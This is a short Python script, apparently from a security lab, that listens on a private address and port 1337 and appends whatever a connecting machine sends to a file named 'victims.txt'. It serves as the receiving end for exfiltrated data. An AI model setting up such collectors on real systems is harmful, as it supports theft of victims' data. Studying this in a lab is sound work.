#!/usr/bin/env python3
import socket
IP = "10.0.2.7" # server ip
PORT = 1337
print("Creating socket")
with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    s.bind((IP,PORT))
    print("Listening for connections...")
    s.listen(1)
    conn , address = s.accept()
    print("Connection from",address,"established")
    with conn:
        while True:
            data = conn.recv(1024).decode()
            with open("victims.txt","a") as  f:
                f.write(data+'\n')
            break
        print("Connection completed and closed")
